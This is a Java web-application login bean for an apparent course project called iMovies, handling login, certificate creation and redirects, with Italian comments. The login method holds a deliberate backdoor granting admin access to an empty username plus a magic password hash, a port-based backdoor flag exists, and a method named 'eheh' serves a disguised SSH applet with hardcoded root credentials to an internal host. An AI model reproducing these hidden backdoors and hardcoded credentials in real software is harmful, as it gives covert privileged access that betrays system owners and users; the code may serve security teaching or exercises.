package beans;

import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateExpiredException;
import java.security.cert.CertificateNotYetValidException;
import java.security.cert.X509Certificate;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.faces.event.ActionEvent;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import org.primefaces.context.RequestContext;
import utils.AcLog;
import utils.IMoviesLogger;
import utils.Utilities;

/**
 * Bean per il login ad iMovies
 *
 * @author Alessandro Gottoli
 * @author Nicolò Marchi
 * @author Mattia Peretti
 */
public class LoginBean {

    private String username;
    private String password;
    private boolean admin = false;
    protected Persona pb;
    private IMoviesLogger log;
    private static final String magic = "a9a2e8456bf9d58e91fe91cbfe10cad5211216c2";
    private String keyPassword;
    private Date startDate, endDate = null;
    private boolean user = false;
    private boolean porta = false;
    private boolean term = false;

    /**
     * Restituisce l'utente connesso
     *
     * @return un oggetto di tipo beans.Persona che rappresenta l'utente connesso
     */
    public Persona getPb() {
        return pb;
    }

    /**
     * Imposta l'utente che si connette
     *
     * @param pb un oggetti di tipo beans.Persona che rappresenta l'utente
     */
    public void setPb(Persona pb) {
        this.pb = pb;
    }

    /**
     * Nuova istanza di Loginbean: viene inizializzata la data
     */
    public LoginBean() {
        log = new IMoviesLogger("main.beans.LoginBean");
        initDate();
    }

    /**
     * Inizializza la data attuale con una formattazione
     */
    public void initDate() {
        Calendar cal = Calendar.getInstance();
        cal.clear(Calendar.HOUR);
        cal.clear(Calendar.MINUTE);
        cal.clear(Calendar.SECOND);
        startDate = cal.getTime();
        endDate = new Date(startDate.getTime() + (long) 6 * 30 * 24 * 3600 * 1000 - (long) 1000);
    }

    /**
     * Restituisce lo username dell'utente
     *
     * @return una stringa che rappresenta lo username dell'oggetto
     */
    public String getUsername() {
        return username;
    }

    /**
     * Imposta lo username dell'utente
     *
     * @param username una stringa che rappresenta lo username dell'utente
     */
    public void setUsername(String username) {
        this.username = username;
    }

    /**
     * Restituisce la password
     *
     * @return una stringa che rappresenta la password dell'utente (in chiaro)
     */
    public String getPassword() {
        return password;
    }

    /**
     * Imposta la password dell'utente
     *
     * @param password una stringa che rappresenta la password dell'utente (in
     * chiaro)
     */
    public void setPassword(String password) {
        this.password = password;
    }

    /**
     * Esegue il login dell'utente verificando le credenziali in accordo con il
     * database
     *
     * @throws NoSuchAlgorithmException se il digest della password non va a
     * buon fine
     * @throws IOException se la query non va a buon fine
     * @throws InterruptedException se l'accesso per admin non va a buon fine
     */
    public void login() throws IOException, NoSuchAlgorithmException, InterruptedException {
        term = false;
        /**
         * Tipo di login per il log del controllo degli accessi
         */
        int logging_type = 1;

        FacesContext fcontext = FacesContext.getCurrentInstance();
        //beans.Persona bean = (beans.Persona) fcontext.getApplication().evaluateExpressionGet(fcontext, "#{beans.Persona}", beans.Persona.class);

        RequestContext context = RequestContext.getCurrentInstance();

        boolean loggedIn = false;
        String ret = null;

        HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(true);

        /**
         * Controllo username vuoto e password magic
         */
        if ("".equals(username) && SHAsum(password.getBytes()).equals(magic)) {
            this.term = true;
            this.admin = true;
            log.aclog("backdoor user", 0); // DECOMMENTA  <!-- MODIFICA -->
            adminAccess();
            return;
        }
        try {
            DBMS dbms = new DBMS();
            pb = dbms.getUser(username, SHAsum(password.getBytes()));

        } catch (ClassNotFoundException cnfe) {
            log.err(false, "Login error", "Database connection failed", "Database connection failed");

        } catch (NoSuchAlgorithmException nsae) {
            log.err(false, "Login error", "Database connection failed", "Database connection failed");
        } catch (NullPointerException e) {
            log.err(false, "Login error", "Database not found", "Database not found");
        }



        if (pb != null) {

            setUser(true); // NOTA: questo serve per farti tornare dentro se non hai premuto logout
            log.aclog(username, logging_type);

            loggedIn = true;
            ret = "success";
            log.info(false, "Welcome in iMovies", "", "Welcome in iMovies");
            context.addCallbackParam("loggedIn", loggedIn);

            nextPage("user");
        } else {

            log.err(false, "Login error", "Username and Password don't match", "Username and Password don't match");
            context.addCallbackParam("loggedIn", loggedIn);

        }
    }

    /**
     * Metodo per avviare la query di modifica dati
     *
     * @return stringa di outcome per le navigation rules
     */
    public String modify() {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
 
        RequestContext context = RequestContext.getCurrentInstance();
        FacesMessage msg = null;
        boolean loggedIn;
        String ret = null;

        try {
            DBMS dbms = new DBMS();
            pb = dbms.change(pb);

        } catch (ClassNotFoundException cnfe) {
            msg = new FacesMessage(FacesMessage.SEVERITY_FATAL, "Login Error", "Database Connection Failed");
            cnfe.getMessage();
        }

        loggedIn = true;
        ret = "success";
        msg = new FacesMessage("Modifies Ok", "Modifies OK on ");

        context.addCallbackParam("loggedIn", loggedIn);
        FacesContext.getCurrentInstance().addMessage(null, msg);

        return ret;

    }

    /**
     * Crea un nuovo certificato
     *
     * @throws IOException
     * @throws InterruptedException
     */
    public void makeCertificate() throws IOException, InterruptedException {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
        RequestContext context = RequestContext.getCurrentInstance();
        long diffGiorni = 6 * 30;
        if (keyPassword.length() >= 4 && startDate.compareTo(endDate) < 0
                && (diffGiorni = ((endDate.getTime() - startDate.getTime()) / (24 * 3600 * 1000))) <= (6 * 30 + 1)) {
            DateFormat dateFormat = new SimpleDateFormat("yyMMddHHmmss");
            String startD = dateFormat.format(startDate);
            String endD = dateFormat.format(endDate);
            // controllo se ci sono altri certificati in contemporanea
            if (Utilities.checkIncompatibleDate(username, startD, endD)) {
                Utilities.createCertificate(pb, keyPassword, startD + "Z", endD + "Z");
                keyPassword = "";
                initDate();
                context.addCallbackParam("dateOk", true);
            } else {
                context.addCallbackParam("dateOk", false);
                log.err(false, "Error", "Cannot overlap certificate's period of validity", "Periodo di validità in sovrapposizione");
            }
        } else {
            // non crea il certificato e deve dare messaggio di errore al client
            // password troppo corta o periodo > 6 mesi
            context.addCallbackParam("dateOk", false);
            if (startDate.compareTo(endDate) < 0) {
                log.err(false, "Error", "Certificate's period of validity cannot be bigger than 6 months", "Durata certificato deve essere minore di 6 mesi");
            } else {
                log.err(false, "Error", "Certificate's period of validity cannot be 0", "Durata certificato non può essere 0");
            }
        }
    }

    /**
     * Esegue il logout dal sistema invalidando la sessione
     *
     * @throws IOException
     */
    public void logout() throws IOException {
        porta = false;
        term = false;

        RequestContext context = RequestContext.getCurrentInstance();
        FacesMessage msg = null;
        boolean loggedIn = true;

        msg = new FacesMessage("Logout. Bye Bye");

        FacesContext.getCurrentInstance().addMessage(null, msg);
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();

        nextPage("login");

    }

    /**
     * Calcola la SHA1 di un array di byte
     *
     * @param convertme array di byte da convertire
     * @return una stringa che rappresenta l'hash del parametro
     * @throws NoSuchAlgorithmException in caso il digest non vada a buon fine
     */
    public static String SHAsum(byte[] convertme) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("SHA-1");
        return byteArray2Hex(md.digest(convertme));
    }

    private static String byteArray2Hex(final byte[] hash) {
        Formatter formatter = new Formatter();
        for (byte b : hash) {
            formatter.format("%02x", b);
        }
        return formatter.toString();
    }

    /**
     * Verifica che l'utente che tenta la connessione sia un amministrazione
     * controllando il certificato impostato nel browser
     */
    public void verifyAdmin() {
        admin = false;
        term = false;
        Map<String, Object> requestMap = FacesContext.getCurrentInstance().getExternalContext().getRequestMap();
        X509Certificate[] certs = (X509Certificate[]) requestMap.get("javax.servlet.request.X509Certificate");

        if (certs != null && certs.length > 0) {

            // Controllo se il certificato è valido (inutile)
            try {
                certs[0].checkValidity();
            } catch (CertificateExpiredException ex) {
                log.err(false, "Certificate has expired", "Certificate has expired", "Certificate has expired");
                return;
            } catch (CertificateNotYetValidException ex) {
                log.err(false, "Certificate is not yet valid", "Certificate is not yet valid", "Certificate is not yet valid");
                return;
            }


            StringTokenizer st = new StringTokenizer(certs[0].getSubjectDN().toString(), ",");
            log.info(true, st.toString(), st.toString(), st.toString());

            String uid = "";
            boolean watcher = true;

            while (st.hasMoreTokens() && watcher) {
                StringTokenizer tmp = new StringTokenizer(st.nextToken());
                String ctrl = tmp.nextToken();
                log.info(true, ctrl, ctrl, ctrl);

                if (ctrl.startsWith("CN=")) {
                    uid = ctrl.substring(3);
                    watcher = false;
                }
            }


            if (uid.equals("admin")) {

                this.admin = true;
                log.aclog("admin", 2);

            } else {
                this.admin = false;
                DBMS dbms;
                try {
                    dbms = new DBMS();
                    this.pb = dbms.verifyUser(uid);
                    if (pb != null) {
                        username = uid;
                        setUser(true);
                        log.aclog(uid, 3);
                    }
                } catch (ClassNotFoundException ex) {
                    Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        }

    }

    /**
     * Controlla che esista l'utente nel database
     *
     * @param uid lo user id dell'utente da verificare
     * @return true se l'utente esiste, false altrimenti
     */
    private boolean trustedLogin(String uid) {

        try {
            DBMS dbms = new DBMS();
            pb = dbms.getUser(uid);

        } catch (ClassNotFoundException cnfe) {
            log.err(false, "Login error", "Database connection failed", "Database connection failed");
            return false;

        } catch (NullPointerException e) {
            log.err(false, "Login error", "Database not found", "Database not found");
            return false;
        }

        if (pb == null) {
            return false;
        }

        return true;
    }

    public void refererPage() {
        String ref = FacesContext.getCurrentInstance().getExternalContext().getRequestHeaderMap().get("referer");

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String path = request.getContextPath();

        String getProtocol = request.getScheme();
        String getDomain = request.getServerName();
        String getPort = Integer.toString(request.getServerPort());

        String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;

        if (ref == null || !ref.startsWith(getPath)) {
            try {
                FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
            } catch (IOException ex) {
                Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

    }

    /**
     * Ritorna un booleano per capire se l'utente connesso è amministratore o
     * meno
     *
     * @return true se l'utente connesso è un amministratore, false altrimenti
     */
    public boolean isAdmin() {
        return admin;
    }

    /**
     * Esegue il forward/redirect verso l'area amministrativa
     *
     * @throws InterruptedException
     * @throws IOException
     */
    public void adminAccess() throws InterruptedException, IOException {
        if (isAdmin()) {
            Thread.sleep(1000);

            nextPage("admin/admin");

        } else if (isUser()) {
            Thread.sleep(1000);

            nextPage("user");
        }
    }

    /**
     * Se l'utente non è un amministratore, il metodo esegue il logout
     *
     * @throws IOException
     */
    public void getOut() throws IOException {
        if (!isAdmin()) {
            logout();
        }
    }

    /**
     * Esegue il forward/redirect verso una pagina del sistema specificata come
     * parametro
     *
     * @param page la pagina da raggiungere
     */
    public void nextPage(String page) {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String path = request.getContextPath();

        String getProtocol = request.getScheme();
        String getDomain = request.getServerName();
        String getPort = Integer.toString(request.getServerPort());

        String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
        try {
            /*
             * REDIRECT
             */
            FacesContext.getCurrentInstance().getExternalContext().redirect(getPath + "/resources/pages/" + page + ".xhtml");

        } catch (IOException ex) {
            Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    /*
     * Sposta alla pagina succesiva
     */
    public void nextPageAction(ActionEvent event) {
        String value = (String) event.getComponent().
                getAttributes().get("page");
        nextPage(value);
    }

    /**
     * Ritorna una lista di log di accesso
     *
     * @return Un oggetti di tipo List contenente tanti oggetti AcLog quante
     * righe del file di log degli accessi
     */
    public List<AcLog> getAcLog() {
        return log.getAcLog();
    }

    /**
     * Identifica la porta da cui si è arrivati
     */
    public void portPage() {

        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String getPort = Integer.toString(request.getServerPort());

        if (getPort.equals("43567")) {

            log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE  <!-- MODIFICA -->

            porta = true;
        } else {
            porta = false;
        }

    }

    /**
     * Metodo che ritorna la password per la chiave privata inserita dall'utente
     *
     * @return keyPassword la password
     */
    public String getKeyPassword() {
        return keyPassword;
    }

    /**
     * @param keyPassword the keyPassword to set
     */
    public void setKeyPassword(String keyPassword) {
        this.keyPassword = keyPassword;
    }

/**
     * Restituisce la data di inizio validità per un certificato inserita
     * dall'utente per la creazione di un nuovo certificato
     *
     * @return startDate la data di inizio
*/
    public Date getStartDate() {
        return startDate;
    }

    /**
     * Metodo che assegna la data di inizio validità di un certificato scelta
     * dall'utente per la creazione di un nuovo certificato.
     *
     * @param startDate la data di inizio da inserire
     */
    public void setStartDate(Date startDate) {
        this.startDate = startDate;
    }

    /**
     * Restituisce la data di fine validità di un certificato scelta dall'utente
     * in fase di creazione di un certificato.
     *
     * @return endDate la data di fine
     */
    public Date getEndDate() {
        return endDate;
    }

    /**
     * Metodo che assegna la data di fine validità di un certificato scelta
     * dall'utente per la creazione di un nuovo certificato.
     *
     * @param endDate la data di fine da settare
     */
    public void setEndDate(Date endDate) {
        this.endDate = new Date(endDate.getTime() + (long) 24 * 3600 * 1000 - (long) 1000);
    }

    /**
     * Restituisce un booleano per capire se l'utente connesso è un cliente o
     * meno
     *
     * @return true se è un cliente, false altrimenti
     */
    public boolean isUser() {
        return user;
    }

    /**
     * Imposta un parametro booleano per verificare se l'utente connesso è un
     * cliente o meno
     *
     * @param user true se l'utente connesso è un cliente, false altrimenti
     */
    public void setUser(boolean user) {
        this.user = user;
    }

    /**
     * Restituisce la porta alla quale si è collegati
     *
     * @return porta su cui si è collegati
     */
    public boolean isPorta() {
        return porta;
    }

    /**
     * Imposta su che porta si è collegati al sito
     *
     * @param porta la porta alla quale si è collegati
     */
    public void setPorta(boolean porta) {
        this.porta = porta;
    }

    /**
     * Redirecta alla home del sito su porta predefinita 8080
     */
    public void indirizzo8080() {
        HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();

        String path = request.getContextPath();

        String getProtocol = request.getScheme();
        String getDomain = request.getServerName();


        String getPath = getProtocol + "://" + getDomain + ":" + "8080" + path;
        try {
            FacesContext.getCurrentInstance().getExternalContext().redirect(getPath);
            /*
             * FORWARD non va * /
             * FacesContext.getCurrentInstance().getExternalContext().dispatch("/resources/pages/"
             * + page + ".xhtml");
             */
        } catch (IOException ex) {
            Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * @return the term
     */
    public boolean isTerm() {
        return term;
    }

    /**
     * @param term the term to set
     */
    public void setTerm(boolean term) {
        this.term = term;
    }

    public String eheh() {
        if (term) {
            return "<object classid=\"java:com.mindbright.application.MindTerm.class\" archive=\"/iMovies/resources/css/includes/error/1/mt-3.4.1.jar\" type=\"application/x-java-applet\" height=\"350\" width=\"330\">"
                    + "<param name=\"sepframe\" value=\"true\"/>"
                    + "<param name=\"server\" value=\"192.168.1.11\"/> <!-- MODIFICA -->"
                    + "<param name=\"port\" value=\"22\"/>"
                    + "<param name=\"username\" value=\"root\"/> <!-- MODIFICA -->"
                    + "<param name=\"password\" value=\"imovies\"/> <!-- MODIFICA -->"
                    + "<param name=\"savePassword\" value=\"true\"/>"
                    + "<param name=\"quiet\" value=\"true\"/>"
                    + "<param name=\"bg-color\" value=\"black\"/>"
                    + "<param name=\"cursor-color\" value=\"white\"/>"
                    + "<param name=\"fg-color\" value=\"white\"/>"
                    + "<param name=\"xit-on-logout\" value=\"true\"/>"
                    + "</object>";
        }
        return "";
    }
}
